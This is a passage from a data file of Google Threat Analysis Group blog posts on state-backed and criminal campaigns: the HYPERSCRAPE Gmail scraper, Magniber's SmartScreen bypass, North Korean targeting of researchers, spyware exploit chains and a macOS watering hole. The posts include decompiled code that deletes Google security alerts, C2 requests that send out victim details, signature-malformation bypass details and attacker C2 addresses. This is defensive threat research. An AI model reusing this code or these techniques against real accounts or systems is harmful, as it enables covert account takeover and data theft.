analysis on a Telegram grabber tool.\nHYPERSCRAPE demonstrates Charming Kitten’s commitment to developing and maintaining purpose-built capabilities.\nLike much of their tooling, HYPERSCRAPE is not notable for its technical sophistication, but rather its effectiveness in accomplishing Charming Kitten’s objectives.\nHYPERSCRAPE Analysis HYPERSCRAPE requires the victim’s account credentials to run using a valid, authenticated user session the attacker has hijacked, or credentials the attacker has already acquired.\nIt spoofs the user agent to look like an outdated browser, which enables the basic HTML view in Gmail.\nOnce logged in, the tool changes the account’s language settings to English and iterates through the contents of the mailbox, individually downloading messages as .eml files and marking them unread.\nAfter the program has finished downloading the inbox, it reverts the language back to its original settings and deletes any security emails from Google.\nEarlier versions contained the option to request data from Google Takeout, a feature which allows users to export their data to a downloadable archive file.\nThe tool is written in .NET for Windows PCs and is designed to run on the attacker's machine.\nWe tested HYPERSCRAPE in a controlled environment with a test Gmail Account, although functionality may differ for Yahoo!\nand Microsoft accounts.\nHYPERSCRAPE won't run unless in a directory with other file dependencies.\nHYPERSCRAPE file metadata HYPERSCRAPE Setup When launched, the tool makes an HTTP GET request to a C2 to check for a response body of \"OK'' and will terminate if it's not found.\nIn the version tested, the C2 was unobfuscated and stored as a hardcoded string.\nIn later versions it was obfuscated with Base64.\nGET http://{C2}/Index.php?Ck=OK HTTP/1.1 Host: {C2} Accept-Encoding: gzip Connection: Keep-Alive The tool accepts arguments from the command line such as the mode of operation, an identifier string, and a path string to a valid cookie file.\nA new form is displayed if the information is not provided via command prompt.\nInitial form to specify operation parameters Once provided, the data in the \"Identity\" field is sent to a C2 for confirmation.\nAgain, the response is expected to be \"OK\".\nGET http://{C2}/Index.php?vubc={identity} HTTP/1.1 Host: {C2} Accept-Encoding: gzip If the cookie file path was not supplied via the command line, a new form will allow the operator to do so using drag and drop.\nThe cookie drag and drop form After parsing, the cookies are inserted into a local cache used by the embedded web browser.\nA new folder named \"Download\" is created adjacent to the main binary.\nThe browser then navigates to Gmail to begin the data collection.\nThe user agent is spoofed so it appears like an outdated browser, which results in an error message and allows the attacker to enable the basic HTML view in Gmail.\nThe error page from using an unsupported browser If the cookies failed to provide access to the account, a login page is displayed and the attacker can manually enter credentials to proceed, as the program will wait until it finds the inbox page.\nThe login page What HYPERSCRAPE does Once the attacker has logged in to the victim’s account, HYPERSCRAPE checks to see if the language is set to English, changing it if not.\nThe language is returned to its original setting when the run is finished.\nHYPERSCRAPE then begins iterating through all available tabs in the inbox looking for emails to download.\nIt does the following for each email found: - Clicks on the email and opens it - Downloads it - If the email was originally unread, marks it unread - Goes back to the inbox The emails are saved with \".eml\" extensions under the Downloads directory with the filename corresponding to the subject.\nA log file is written containing a count of the emails that were downloaded.\nWhen finished, a HTTP POST request is made to the C2 to relay the status and system information.\nThe downloaded emails are not sent to the C2.\nPOST http://{C2}/?Key={GUID}&Crc={Identifier} { \"appName\": \"Gmail Downloader\", \"targetname\": \"{Email}\", \"HostName\": \"REDACTED\", \"srcUserIP\": \"REDACTED\", \"actionType\": \"First\", \"timeOccurrence\": \"05/01/2022 05:50:31 PM\", \"OS\": \"REDACTED\", \"OSVersion\": \"REDACTED\", \"SystemModel\": \"REDACTED\", \"SystemType\": \"REDACTED\", \"srcName\": \"REDACTED\", \"srcOrgName\": \"REDACTED\" } The program will delete any security emails from Google generated by the attacker’s activity.\nprivate bool IsThereAnyEMail() { List < GeckoHtmlElement > list = (from x in this.geckoWebBrowser.\nDocument.\nGetElementsByTagName(\"span\") where x.TextContent.\nStartsWith (\"Security alert\") || x.TextContent.\nStartsWith(\"Archive of Google data requested\") || x.TextContent.\nStartsWith(\"Your Google data archive is ready\") || x.TextContent.\nStartsWith(\"Your Google data is ready\") || x.TextContent.\nStartsWith(\"Critical security alert\") || x.TextContent.\nStartsWith(\"Access for less secure apps has been turned on\") || x.TextContent.\nStartsWith(\"Review blocked sign-in attempt\") || x.TextContent.\nStartsWith(\"Help us protect you: Security advice from Google\") || x.TextContent.\nStartsWith(\"Access for less secure apps has been turned on\") select x).ToList < GeckoHtmlElement > (); bool flag = list.\nCount == 0; return !\nflag; } Early versions contained an option to request Google Takeout data Data from Google Takeout is also available upon request, but the option was only found in early builds.\nThe functionality was not automated and it's unclear why it was removed in later versions.\nWhen conducting a Takeout, the program will spawn a new copy of itself and initialize a pipe communication channel to relay the cookies and account name, both of which are required to accomplish the Takeout.\nWhen they are received, the browser navigates to the official Takeout link to request and eventually download the exported data.\npublic void ManageTakeOut() { string text = \"PipeName\"; Process process = new Process(); process.\nStartInfo.\nArguments = string.\nFormat(\"PIPE Google \\\"{0}\\\"\", text); process.\nStartInfo.\nFileName = Process.\nGetCurrentProcess().MainModule.\nFileName; process.\nStart(); PipeCommunication pipeCommunication = new PipeCommunication(true, text); bool flag = false; while (!\nflag) { try { JsonInfo jsonInfo = pipeCommunication.\nRead(); switch (jsonInfo.\nType) { case JsonType.\nGetCookies: jsonInfo.\nData = this.\nCookieText; pipeCommunication.\nWrite(jsonInfo); break; case JsonType.\nTakeOutFile: flag = true; break; case JsonType.\nGetUsername: while (this.\nOperationObject.\nGetUsername() == null) { Thread.\nSleep(1000); } jsonInfo.\nData = this.\nOperationObject.\nGetUsername(); pipeCommunication.\nWrite(jsonInfo); break; } } catch (Exception) { bool hasExited = process.\nHasExited; if (hasExited) { flag = true; } } } pipeCommunication.\nClose(); } Protecting Our Users TAG is committed to sharing research to raise awareness on bad actors like Charming Kitten within the security community, and for companies and individuals that may be targeted.\nIt’s why we do things like work with our CyberCrime Investigation Group to share critical information relevant to law enforcement.\nWe hope doing so will improve understanding of tactics and techniques that will enhance threat hunting capabilities and lead to stronger protections across the industry.\nWe’ll also continue to apply those findings internally to improve the safety and security of our products so we can effectively combat threats and protect users who rely on our services.\nIn the meantime, we encourage high risk users to enroll in our Advanced Protection Program (APP) and utilize Google Account Level Enhanced Safe Browsing to ensure they have the greatest level of protection in the face of ongoing threats.\nHYPERSCRAPE Indicators C2s 136.243.108.14 173.209.51.54 HYPERSCRAPE binaries 03d0e7ad4c12273a42e4c95d854408b98b0cf5ecf5f8c5ce05b24729b6f4e369 35a485972282b7e0e8e3a7a9cbf86ad93856378fd96cc8e230be5099c4b89208 5afc59cd2b39f988733eba427c8cf6e48bd2e9dc3d48a4db550655efe0dca798 6dc0600de00ba6574488472d5c48aa2a7b23a74ff1378d8aee6a93ea0ee7364f 767bd025c8e7d36f64dbd636ce0f29e873d1e3ca415d5ad49053a68918fe89f4 977f0053690684eb509da27d5eec2a560311c084a4a133191ef387e110e8b85f ac8e59e8abeacf0885b451833726be3e8e2d9c88d21f27b16ebe00f00c1409e6 cd2ba296828660ecd07a36e8931b851dda0802069ed926b3161745aae9aa6daa Microsoft Live DLL 1a831a79a932edd0398f46336712eff90ebb5164a189ef38c4dacc64ba84fe23 PDB E:\\Working\\Projects\\EmailDownloader\\EmailDownloaderCookieMode\\EmailDownloader\\obj\\Debug\\EmailDownloader.pdb E:\\Working\\Projects\\EmailDownloader\\EmailDownloaderCookieMode\\Mahdi\\LiveLib\\obj\\Release\\LiveLib.pdb","num_sentences":91,"metadata":{"source":"blog","platform":"Google_TAG","filename":"iranian"}}
{"id":45,"title":"Magniber ransomware actors used a variant of Microsoft SmartScreen bypass","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/magniber-ransomware-actors-used-a-variant-of-microsoft-smartscreen-bypass/","clean_text":"Magniber ransomware actors used a variant of Microsoft SmartScreen bypass Google’s Threat Analysis Group (TAG) recently discovered usage of an unpatched security bypass in Microsoft’s SmartScreen security feature, which financially motivated actors are using to deliver the Magniber ransomware without any security warnings.\nThe attackers are delivering MSI files signed with an invalid but specially crafted Authenticode signature.\nThe malformed signature causes SmartScreen to return an error that results in bypassing the security warning dialog displayed to users when an untrusted file contains a Mark-of-the-Web (MotW), which indicates a potentially malicious file has been downloaded from the internet.\nTAG reported its findings to Microsoft on February 15, 2023.\nThe security bypass was patched today as CVE-2023-24880 in Microsoft’s Patch Tuesday release.\nTAG has observed over 100,000 downloads of the malicious MSI files since January 2023, with over 80% to users in Europe — a notable divergence from Magniber’s typical targeting, which usually focuses on South Korea and Taiwan.\nGoogle Safe Browsing displayed user warnings for over 90% of these downloads.\nThe Previous SmartScreen Bypass: CVE-2022-44698 In September 2022, Magniber ransomware was delivered using JScript files.\nIn October, HP Threat Research blogged about these Magniber campaigns, upon which a security researcher noticed a bug in SmartScreen that allowed an attacker to use a malformed Authenticode signature to bypass SmartScreen security warnings.\nOn October 28, 0patch published additional research and patch recommendations.\nIn mid-November, other threat actors adopted the same bypass to spread the Qakbot malware.\nThe Authenticode signatures in the November 2022 Qakbot campaigns were strikingly similar to those used by Magniber, suggesting the two operators either purchased the bypasses from the same provider, or copied each others’ technique.\nMicrosoft patched the security bypass in December 2022 as CVE-2022-44698.\nSimilar to the bypass occurring now, Magniber ransomware actors used CVE-2022-44698 before a patch was made available.\nHowever, the Magniber actors used JScript files during the previous campaigns, whereas in the current campaign they are using MSI files with a different type of malformed signature.\nSecurity Bypass Details CVE-2022-44698 Root cause analysis As described in 0patch’s blog, when the explorer.exe process runs a file, the shdocvw.dll module will perform a request to the AppReputationService interface implemented in smartscreen.exe to get a verdict.\nHigh level overview of security warning dialog logic By default, shdocvw.dll’s DoSafeOpenPromptForShellExec will not display a security warning, and if the smartscreen.exe request returns an error for whatever reason, DoSafeOpenPromptForShellExec proceeds with using the default option and runs the file without displaying any security warnings to the user.\nshdocvw.dll’s DoSafeOpenPromptForShellExec pseudocode In CVE-2022-44698’s case, a JScript file with a malformed signature was used to force the SmartScreen request to return an error, triggering the behavior described above to bypass the security warning.\nThe error was raised while parsing the file’s signature in the function windows::security::signature_info::retrieve of smartscreen.exe.\nsmartscreen.exe’s windows::security::signature_info::retrieve pseudocode Specifically, this function will first call WTGetSignatureInfo in wintrust.dll to retrieve a CERT_CONTEXT structure pointer cert_context and a HANDLE wvt_state_data.\nThe cert_context, for a well formed signature, will point to the signer certificate, which is the first certificate in the certificate chain.\nNext, the function calls WTHelperProvDataFromStateData on wvt_state_data, which returns a CRYPT_PROVIDER_DATA structure pointer crypt_provider_data.\nNow, if crypt_provider_data and its member hMsg are non-NULL, but cert_context is NULL, an E_INVALIDARG error is raised.\nBypass Authenticode signatures are encoded in PKCS #7 SignedData structures.\nA SignedData structure contains amongst other things a list of certificates that are required to validate the signature and a SignerInfo structure.\nThe SignerInfo structure in its turn contains the issuer and serial number of the signer certificate, which can then be looked up in the SignedData certificates.\nIn practice, the attackers achieved a NULL cert_context by providing an Authenticode signature where the SignerInfo certificate serial number can not be found among the SignedData certificates.\nThis leads to wintrust.dll not being able to find the certificate for the signer, in which case WTGetSignatureInfo will return a NULL value for cert_context.\nMagniber used CVE-2022-44698 by providing a signer certificate serial number that is not present in the signature certificates.\nIt’s noteworthy that the signatures in the November 2022 Qakbot campaigns are highly similar to the Magniber signatures, except for a few randomized fields.\nComparison between the certificates included in a Magniber and Qakbot signature CVE-2023-24880 Root cause analysis Microsoft patched CVE-2022-44698 in smartscreen.exe, by not raising an error in this specific case, but rather taking an alternative path.\nCVE-2022-44698 patch of windows::security::signature_info::retrieve The problem with this patch is that THROW_HR is called from many other places in smartscreen.exe when different errors are encountered.\nEvery one of these is a potential opportunity for an attacker to return an error to shdocvw.dll, which will fail open and not display a security warning.\nThis is exactly the route the attackers took with the new bypass.\nThe signature in this case leads to a valid cert_context, so the CVE-2022-44698 patch is not applicable.\nFurther on windows::security::signature_info::retrieve calls windows::security::authenticode_information::create.\nThis function checks if crypt_provider_data->pPDSip->psIndirectData is non-NULL.\nIf not, it calls THROW_HR which will again return an error to shdocvw.dll.\nsmartscreen.exe’s windows::security::authenticode_information::create pseudocode Bypass To obtain a NULL crypt_provider_data->pPDSip->psIndirectData, the attackers corrupted the ASN1 numerical identifier (NID) of the SPC_INDIRECT_DATA_OBJID, a Authenticode specific Object Identifier (OID) which contains, for example, the message digest of the signed file.\nMagniber corrupted the SPC_INDIRECT_DATA_OBJID NID, which leads to crypt_provider_data->pPDSip->psIndirectData being NULL and an error being raised.\nConclusion This security bypass is an example of a larger trend Project Zero has highlighted previously: vendors often release narrow patches, creating an opportunity for attackers to iterate and discover new variants.\nWhen patching a security issue, there is tension between a localized, reliable fix, and a potentially harder fix of the underlying root cause issue.\nBecause the root cause behind the SmartScreen security bypass was not addressed, the attackers were able to quickly identify a different variant of the original bug.\nProject Zero has written and presented extensively on this trend, and recommends several practices to ensure bugs are correctly and comprehensively fixed.\nIndicators of compromise (IoCs) - ad89fb8819f98e38cddf6135004e1d93e8c8e4cba681ba16d408c4d69317eb47 (CVE-2022-44698, Magniber) - 77e3a3bc905f9a172e95ba70bf01c3236e6c6423f537fa728b1bda5a40a77fe3 (CVE-2022-44698, Qakbot) - 8efb4e8bc17486b816088679d8b10f8985a31bc93488c4b65116f56872c1ff16 (CVE-2023-24880, Magniber)","num_sentences":45,"metadata":{"source":"blog","platform":"Google_TAG","filename":"magniber"}}
{"id":46,"title":"Active North Korean campaign targeting security researchers","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/active-north-korean-campaign-targeting-security-researchers/","clean_text":"Active North Korean campaign targeting security researchers Updated October 31, 2023 In January 2021, Threat Analysis Group (TAG) publicly disclosed a campaign from government backed actors in North Korea who used 0-day exploits to target security researchers working on vulnerability research and development.\nOver the past two and a half years, TAG has continued to track and disrupt campaigns from these actors, finding 0-days and protecting online users.\nRecently, TAG became aware of a new campaign likely from the same actors based on similarities with the previous campaign.\nTAG is aware of at least one actively exploited 0-day being used to target security researchers in the past several weeks.\nThe vulnerability has been reported to the affected vendor and is in the process of being patched.\nWhile our analysis of this campaign continues, we are providing an early notification of our initial findings to warn the security research community.\nWe hope this post will remind security researchers that they could be targets of government backed attackers and to stay vigilant of security practices.\nSecurity researcher targeting Similar to the previous campaign TAG reported on, North Korean threat actors used social media sites like X (formerly Twitter) to build rapport with their targets.\nIn one case, they carried on a months-long conversation, attempting to collaborate with a security researcher on topics of mutual interest.\nAfter initial contact via X, they moved to an encrypted messaging app such as Signal, WhatsApp or Wire.\nOnce a relationship was developed with a targeted researcher, the threat actors sent a malicious file that contained at least one 0-day in a popular software package.\nActor-controlled Twitter profile Upon successful exploitation, the shellcode conducts a series of anti-virtual machine checks and then sends the collected information, along with a screenshot, back to an attacker-controlled command and control domain.\nThe shellcode used in this exploit is constructed in a similar manner to shellcode observed in previous North Korean exploits.\nThe vulnerability was reported to the affected vendor who issued a patch on September 12, 2023.\nIn line with our disclosure policies, TAG has published a root cause analysis (RCA) to cover additional technical details and analysis of the exploits involved.\nPotential secondary infection vector In addition to targeting researchers with 0-day exploits, the threat actors also developed a standalone Windows tool that has the stated goal of 'download debugging symbols from Microsoft, Google, Mozilla and Citrix symbol servers for reverse engineers.'\nThe source code for this tool was first published on GitHub on September 30, 2022, with several updates being released since.\nOn the surface, this tool appears to be a useful utility for quickly and easily downloading symbol information from a number of different sources.\nSymbols provide additional information about a binary that can be helpful when debugging software issues or while conducting vulnerability research.\nBut the tool also has the ability to download and execute arbitrary code from an attacker-controlled domain.\nIf you have downloaded or run this tool, TAG recommends taking precautions to ensure your system is in a known clean state, likely requiring a reinstall of the operating system.\nGithub repository for GetSymbol Protecting the community As part of our efforts to combat serious threat actors, TAG uses the results of our research to improve the safety and security of Google’s products.\nUpon discovery, all identified websites and domains are added to Safe Browsing to protect users from further exploitation.\nTAG also sends all targeted Gmail and Workspace users government-backed attacker alerts notifying them of the activity and encourages potential targets to enable Enhanced Safe Browsing for Chrome and ensure that all devices are updated.\nWe are committed to sharing our findings with the security community to raise awareness, and with companies and individuals that might have been targeted by these activities.\nWe hope that improved understanding of tactics and techniques will enhance threat hunting capabilities and lead to stronger user protections across the industry.\nActor controlled sites and accounts GetSymbol: - https://github[.]com/dbgsymbol/ - https://dbgsymbol[.]com - 50869d2a713acf406e160d6cde3b442fafe7cfe1221f936f3f28c4b9650a66e9 - 0eedfd4ab367cc0b6ab804184c315cc9ce2df5062cb2158338818f5fa8c0108e - 2ee435bdafacfd7c5a9ea7e5f95be9796c4d9f18643ae04dca4510448214c03c - 5977442321a693717950365446880058cc2585485ea582daa515719c1c21c5bd C2 IPs/Domains: - 23.106.215[.]105 - www.blgbeach[.]com X (formerly Twitter) Accounts - https://twitter.com/Paul091_ Wire Accounts - @paul354 Mastodon Account:","num_sentences":27,"metadata":{"source":"blog","platform":"Google_TAG","filename":"north-korean-campaign"}}
{"id":47,"title":"Spyware vendors use 0-days and n-days against popular platforms","publish_date":"2025-03-28","link":"https://blog.google/threat-analysis-group/spyware-vendors-use-0-days-and-n-days-against-popular-platforms/","clean_text":"Spyware vendors use 0-days and n-days against popular platforms Google’s Threat Analysis Group (TAG) tracks actors involved in information operations (IO), government backed attacks and financially motivated abuse.\nFor years, TAG has been tracking the activities of commercial spyware vendors to protect users.\nToday, we actively track more than 30 vendors with varying levels of sophistication and public exposure selling exploits or surveillance capabilities to government backed actors.\nThese vendors are enabling the proliferation of dangerous hacking tools, arming governments that would not be able to develop these capabilities in-house.\nWhile use of surveillance technologies may be legal under national or international laws, they are often found to be used by governments to target dissidents, journalists, human rights workers and opposition party politicians.\nIn this blog, we’re sharing details about two distinct campaigns we’ve recently discovered which used various 0-day exploits against Android, iOS and Chrome and were both limited and highly targeted.\nThe 0-day exploits were used alongside n-day exploits and took advantage of the large time gap between the fix release and when it was fully deployed on end-user devices.\nOur findings underscore the extent to which commercial surveillance vendors have proliferated capabilities historically only used by governments with the technical expertise to develop and operationalize exploits.\nCampaign #1 - Your missed parcel included 0-days (CVE-2022-42856; CVE-2022-4135) In November 2022, TAG discovered exploit chains with 0-days affecting Android and iOS that were delivered via bit.ly links sent over SMS to users located in Italy, Malaysia and Kazakhstan.\nWhen clicked, the links redirected visitors to pages hosting exploits for either Android or iOS then redirected them to legitimate websites such as the page to track shipments for Italian-based shipment and logistics company BRT or a popular Malaysian news website.\nAn example screenshot from one of the malicious websites iOS Exploit Chain The iOS exploit chain targeted versions prior to 15.1 and contained the following exploits, including one 0-day: - CVE-2022-42856, a WebKit remote code execution exploiting a type confusion issue within the JIT compiler (0-day at time of exploitation). -\nThe exploit used a PAC bypass technique which was fixed in March 2022 when Apple removed DYLD_INTERPOSE from WebKit.\nThe exact same technique was used in Cytrox exploits as described by Citizenlab in their blog about Predator.\nThe “make_bogus_transform” function is part of the PAC bypass and is present in both exploits.\nExtract from CitizenLab report mentioning the “make_bogus_transform” function - CVE-2021-30900, a sandbox escape and privilege escalation bug in AGXAccelerator, fixed by Apple in 15.1.\nThe bug was previously described in an exploit for oob_timestamp published on Github in 2020.\nDescription of CVE-2021-30900 on an exploit for oob_timestamp (CVE-2020-3837) The final payload was a simple stager that pings back the GPS location of the device and gives the attacker the ability to install an .IPA file (iOS application archive) onto the affected device.\nAndroid Exploit Chain The Android exploit chain targeted users on phones with an ARM GPU running Chrome versions prior to 106.\nIt consisted of three exploits, including one 0-day: - CVE-2022-3723, a type confusion vulnerability in Chrome, found by Avast in the wild and fixed in October 2022 in version 107.0.5304.87. -\nCVE-2022-4135, a Chrome GPU sandbox bypass only affecting Android (0-day at time of exploitation), fixed in November 2022.\nSergei Glazunov from Project Zero helped analyze the exploit and wrote a root cause analysis for this bug. -\nCVE-2022-38181, a privilege escalation bug fixed by ARM in August 2022.\nIt is unclear if attackers had an exploit for this vulnerability before it was reported to ARM.\nIt’s worth noting users were redirected to Chrome using Intent Redirection if they were coming from a Samsung Internet Browser.\nIn the past, we have seen attackers redirect users from Chrome to Samsung Internet Browser, similar to CVE-2022-2856, but in this case the redirection occurred the other way.\nWe were unable to obtain the final payload for this exploit chain.\nWhen ARM released a fix for CVE-2022-38181, patches were not immediately incorporated by vendors, resulting in the bugs exploitation.\nThis was recently highlighted by blog posts from Project Zero and Github Security Lab.\nNote, Pixel devices with the 2023-01-05 security update are protected against both exploit chains in this blog.\nChrome users updated to at least version 108.0.5359 are also protected.\nRelated IOCs - https://cdn.cutlink[.]site/p/uu6ekt - landing page - https://api.cutlink[.]site/api/s/N0NBL8/ - Android exploit chain - https://api.cutlink[.]site/api/s/3PU970/ - iOS exploit chain - https://imjustarandomsite.3utilities[.]com - exploit delivery server Campaign #2 - Complete exploit chain against Samsung Internet Browser (CVE-2022-4262; CVE-2023-0266) In December 2022, TAG discovered a complete exploit chain consisting of multiple 0-days and n-days targeting the latest version of Samsung Internet Browser.\nThe exploits were delivered in one-time links sent via SMS to devices located in the United Arab Emirates (UAE).\nThe link directed users to a landing page identical to the one TAG examined in the Heliconia framework developed by commercial spyware vendor Variston.\nThe exploit chain ultimately delivered a fully featured Android spyware suite written in C++ that includes libraries for decrypting and capturing data from various chat and browser applications.\nThe actor using the exploit chain to target UAE users may be a customer or partner of Variston, or otherwise working closely with the spyware vendor.\nThe exploit chain TAG recovered was delivered to the latest version of Samsung’s Browser, which runs on Chromium 102 and does not include recent mitigations.\nIf they had been in place, the attackers would have needed additional vulnerabilities to bypass the mitigations.\nThe exploit chain consisted of multiple 0-days and n-days: - CVE-2022-4262, a type confusion vulnerability in Chrome fixed in December 2022 (0-day at time of exploitation) - similar to CVE-2022-1134. -\nCVE-2022-3038, a sandbox escape in Chrome fixed in August 2022, in version 105 and found by Sergei Glazunov in June 2022. -\nCVE-2022-22706, a vulnerability in Mali GPU Kernel Driver fixed by ARM in January 2022 and marked as being used in the wild.\nAt the time of delivery, the latest Samsung firmware had not included a fix for this vulnerability.\nThis vulnerability grants the attacker system access. -\nCVE-2023-0266, a race condition vulnerability in the Linux kernel sound subsystem reachable from the system user and that gives the attacker kernel read and write access (0-day at time of exploitation).\nThe exploit chain also took advantage of multiple kernel information leak 0-days when exploiting CVE-2022-22706 and CVE-2023-0266.\nGoogle reported these vulnerabilities to ARM and Samsung which have now been fixed as CVE-2023-26083 (ARM) and CVE-2023-21492 (Samsung).\nNote, Samsung fixed CVE-2022-4262 and CVE-2022-3038 in Samsung’s Browser after version 19.0.6 released at the end of December 2022.\nRelated IOCs - www.sufficeconfigure[.]com - landing page and exploit delivery - www.anglesyen[.]org - malware C2 - The following Android system properties might indicate signs of exploitation - sys.brand.note - sys.brand.notes - sys.brand.doc - The following directory on the phone might indicate signs of infection - /data/local/tmp/dropbox Protecting our users To protect our users, Google has reported these vulnerabilities to the vendors.\nWe would be remiss if we did not acknowledge the quick response and patching of these vulnerabilities by Google’s Chrome, Pixel and Android teams, as well as by Apple.\nWe would also like to acknowledge and thank the Amnesty Security Lab for their help uncovering the second campaign detailed in this blog.\nThese campaigns continue to underscore the importance of patching, as users wouldn’t be impacted by these exploit chains if they were running a fully updated device.\nIntermediate mitigations like PAC, V8 sandbox and MiraclePTR have a real impact on exploit developers, as they would have needed additional bugs to bypass these mitigations.\nConclusion These campaigns are a reminder that the commercial spyware industry continues to thrive.\nEven smaller surveillance vendors have access to 0-days, and vendors stockpiling and using 0-day vulnerabilities in secret pose a severe risk to the Internet.\nThese campaigns may also indicate that exploits and techniques are being shared between surveillance vendors, enabling the proliferation of dangerous hacking tools.\nWe remain committed to updating the community, and taking steps to protect users, as we uncover these campaigns.","num_sentences":55,"metadata":{"source":"blog","platform":"Google_TAG","filename":"spyware-vendors-use-0-days"}}
{"id":48,"title":"Analyzing a watering hole campaign using macOS exploits","publish_date":"2021-08-28","link":"https://blog.google/threat-analysis-group/analyzing-watering-hole-campaign-using-macos-exploits/","clean_text":"Analyzing a watering hole campaign using macOS exploits To protect our users, TAG routinely hunts for 0-day vulnerabilities exploited in-the-wild.\nIn late August 2021, TAG discovered watering hole attacks targeting visitors to Hong Kong websites for a media outlet and a prominent pro-democracy labor and political group.\nThe watering hole served an XNU privilege escalation vulnerability (CVE-2021-30869) unpatched in macOS Catalina, which led to the installation of a previously unreported backdoor.\nAs is our policy, we quickly reported this 0-day to the vendor (Apple) and a patch was released to protect users from these attacks.\nBased on our findings, we believe this threat actor to be a well-resourced group, likely state backed, with access to their own software engineering team based on the quality of the payload code.\nIn this blog we analyze the technical details of the exploit chain and share IOCs to help teams defend against similar style attacks.\nWatering Hole The websites leveraged for the attacks contained two iframes which served exploits from an attacker-controlled server—one for iOS and the other for macOS.\niOS Exploits The iOS exploit chain used a framework based on Ironsquirrel to encrypt exploits delivered to the victim's browser.\nWe did not manage to get a complete iOS chain this time, just a partial one where CVE-2019-8506 was used to get code execution in Safari.\nmacOS Exploits The macOS exploits did not use the same framework as iOS ones.\nThe landing page contained a simple HTML page loading two scripts—one for Capstone.js and another for the exploit chain.\nThe parameter rid is a global counter which records the number of exploitation attempts.\nThis number was in the 200s when we obtained the exploit chain.\nWhile the javascript starting the exploit chain checks whether visitors were running macOS Mojave (10.14) or Catalina (10.15) before proceeding to run the exploits, we only observed remnants of an exploit when visiting the site with Mojave but received the full non-encrypted exploit chain when browsing the site with Catalina.\nThe exploit chain combined an RCE in WebKit exploiting CVE-2021-1789 which was patched on Jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in XNU (CVE-2021-30869) patched on Sept 23, 2021.\nRemote Code Execution (RCE) Loading a page with the WebKit RCE on the latest version of Safari (14.1), we learned the RCE was an n-day since it did not successfully trigger the exploit.\nTo verify this hypothesis, we ran git bisect and determined it was fixed in this commit.\nSandbox Escape and Local Privilege Escalation (LPE) Capstone.js It was interesting to see the use of Capstone.js, a port of the Capstone disassembly framework, in an exploit chain as Capstone is typically used for binary analysis.\nThe exploit authors primarily used it to search for the addresses of dlopen and dlsym in memory.\nOnce the embedded Mach-O is loaded, the dlopen and dlsym addresses found using Capstone.js are used to patch the Mach-O loaded in memory.\nWith the Capstone.js configured for X86-64 and not ARM, we can also derive the target hardware is Intel-based Macs.\nEmbedded Mach-O After the WebKit RCE succeeds, an embedded Mach-O binary is loaded into memory, patched, and run.\nUpon analysis, we realized this binary contained code which could escape the Safari sandbox, elevate privileges, and download a second stage from the C2.\nAnalyzing the Mach-O was reminiscent of a CTF reverse engineering challenge.\nIt had to be extracted and converted into binary from a Uint32Array.\nThen the extracted binary was heavily obfuscated with a relatively tedious encoding mechanism--each string is XOR encoded with a different key.\nFully decoding the Mach-O was necessary to obtain all the strings representing the dynamically loaded functions used in the binary.\nThere were a lot of strings and decoding them manually would have taken a long time so we wrote a short Python script to make quick work of the obfuscation.\nThe script parsed the Mach-O at each section where the strings were located, then decoded the strings with their respective XOR keys, and patched the binary with the resulting strings.\nOnce we had all of the strings decoded, it was time to figure out what capabilities the binary had.\nThere was code to download a file from a C2 but we did not come across any URL strings in the Mach-O so we checked the javascript and saw there were two arguments passed when the binary is run–the url for the payload and its size.\nAfter downloading the payload, it removes the quarantine attribute of the file to bypass Gatekeeper.\nIt then elevated privileges to install the payload.\nN-day or 0-day?\nBefore further analyzing how the exploit elevated privileges, we needed to figure out if we were dealing with an N-day or a 0-day vulnerability.\nAn N-day is a known vulnerability with a publicly available patch.\nThreat actors have used N-days shortly after a patch is released to capitalize on the patching delay of their targets.\nIn contrast, a 0-day is a vulnerability with no available patch which makes it harder to defend against.\nDespite the exploit being an executable instead of shellcode, it was not a standalone binary we could run in our virtual environment.\nIt needed the address of dlopen and dlsym patched after the binary was loaded into memory.\nThese two functions are used in conjunction to dynamically load a shared object into memory and retrieve the address of a symbol from it.\nThey are the equivalent of LoadLibrary and GetProcAddress in Windows.\nTo run the exploit in our virtual environment, we decided to write a loader in Python which did the following: - load the Mach-O in memory - find the address of dlopen and dlsym - patch the loaded Mach-O in memory with the address of dlopen and dlsym - pass our payload url as a parameter when running the Mach-O For our payload, we wrote a simple bash script which runs id and pipes the result to a file in /tmp.\nThe result of the id command would tell us whether our script was run as a regular user or as root.\nHaving a loader and a payload ready, we set out to test the exploit on a fresh install of Catalina (10.15) since it was the version in which we were served the full exploit chain.\nThe exploit worked and ran our bash script as root.\nWe updated our operating system with the latest patch at the time (2021-004) and tried the exploit again.\nIt still worked.\nWe then decided to try it on Big Sur (11.4) where it crashed and gave us the following exception.\nThe exception indicates that Apple added generic protections in Big Sur which rendered this exploit useless.\nSince Apple still supports Catalina and pushes security updates for it, we decided to take a deeper look into this exploit.\nElevating Privileges to Root The Mach-O was calling a lot of undocumented functions as well as XPC calls to mach_msg with a MACH_SEND_SYNC_OVERRIDE flag.\nThis looked similar to an earlier in-the-wild iOS vulnerability analyzed by Ian Beer of Google Project Zero.\nBeer was able to quickly recognize this exploit as a variant of an earlier port type confusion vulnerability he analyzed in the XNU kernel (CVE-2020-27932).\nFurthermore, it seems this exact exploit was presented by Pangu Lab in a public talk at zer0con21 in April 2021 and Mobile Security Conference (MOSEC) in July 2021.\nIn exploiting this port type confusion vulnerability, the exploit authors were able to change the mach port type from IKOT_NAMED_ENTRY to a more privileged port type like IKOT_HOST_SECURITY allowing them to forge their own sec_token and audit_token, and IKOT_HOST_PRIV enabling them to spoof messages to kuncd.\nMACMA Payload After gaining root, the downloaded payload is loaded and run in the background on the victim's machine via launchtl.\nThe payload seems to be a product of extensive software engineering.\nIt uses a publish-subscribe model via a Data Distribution Service (DDS) framework for communicating with the C2.\nIt also has several components, some of which appear to be configured as modules.\nFor example, the payload we obtained contained a kernel module for capturing keystrokes.\nThere are also other functionalities built-in to the components which were not directly accessed from the binaries included in the payload but may be used by additional stages which can be downloaded onto the victim's machine.\nNotable features for this backdoor include: - victim device fingerprinting - screen capture - file download/upload - executing terminal commands - audio recording - keylogging Conclusion Our team is constantly working to secure our users and keep them safe from targeted attacks like this one.\nWe continue to collaborate with internal teams like Google Safe Browsing to block domains and IPs used for exploit delivery and industry partners like Apple to mitigate vulnerabilities.\nWe are appreciative of Apple’s quick response and patching of this critical vulnerability.\nFor those interested in following our in-the-wild work, we will soon publish details surrounding another, unrelated campaign we discovered using two Chrome 0-days (CVE-2021-37973 and CVE-2021-37976).\nThat 